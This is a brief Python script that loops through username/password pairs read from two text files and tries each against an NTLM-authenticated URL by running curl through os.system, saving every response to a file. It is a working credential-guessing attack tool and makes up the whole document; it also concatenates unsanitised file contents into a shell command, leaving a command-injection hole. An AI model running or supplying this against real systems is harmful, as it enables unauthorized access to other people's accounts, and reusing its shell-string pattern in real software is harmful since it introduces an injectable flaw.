#!/usr/bin/python
import os
import sys

users = open("usernames.txt","r").read().splitlines()

passwords = open("passwords.txt","r").read().splitlines()
i=0
url = sys.argv[1]
domain = ""
cmd = "curl -k --ntlm -u "
for user in users:
	print("Attempting: " + domain + user.lower() + ":" + passwords[i])
	os.system(cmd + domain + user.lower() + ":" + passwords[i] + " " + url + " -o " + user.lower() + ".html")
	i+=1
